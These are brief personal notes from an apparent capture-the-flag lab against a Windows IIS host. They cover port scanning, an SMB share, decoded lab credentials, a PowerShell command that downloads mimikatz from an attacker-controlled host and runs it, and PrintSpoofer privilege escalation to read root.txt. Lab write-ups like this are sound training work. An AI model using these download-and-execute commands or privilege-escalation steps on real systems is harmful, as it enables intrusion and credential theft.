80/tcp open http syn-ack ttl 125  
135/tcp open msrpc syn-ack ttl 125  
139/tcp open netbios-ssn syn-ack ttl 125  
445/tcp open microsoft-ds IIS syn-ack ttl 125  
**3389**/tcp open ms-wbt-server syn-ack ttl 125  
49663/tcp open IIS syn-ack ttl 125  
49667/tcp open rpc syn-ack ttl 125  
49669/tcp open rpc syn-ack ttl 125
 
80,135,139,445,3389,49663,49667,49669
 
[\\10.10.16.83\nt4wrksv](file:///\\10.10.16.83\nt4wrksv)  
49663
 
Qm9iIC0gIVBAJCRXMHJEITEyMw==  
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk  
Bob - !P@$$W0rD!123  
Bill - Juw4nnaM4n420696969!$$$
 
didn’t work but good to know (for xfreerdp):  
-encryption  
/cert:[deny,ignore,name:<name>,tofu,fingerprint:<hash>:<hash as hex>  
[,fingerprint:<hash>:<another hash>]]  
/cert:name:cert
 
Windows IIS web servers typically use aspx language so make msfvenom payload in this format
 
powershell -c wget "[http://10.2.29.79:8888/mimikatz.exe](http://10.2.29.79:8888/mimikatz.exe)" -outfile mimi.exe  
.\mimi.exe  
Doesn’t work.
 
whoami /priv  
whoami  
google "SeImpersonatePrivilege"
 
Find PrintSpoofer.exe  
wget [https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe](https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe)
 
put file on target machine using smb, and execute it on target machine  
.\PrintSpoofer.exe -I -c cmd.exe
 
Users\Administrator\Desktop\root.txt
 
LL:  
always enumerate  
Windows IIS servers use aspx  
Finding windows user privileges: whoami \priv  
using impersonation privilege for privesc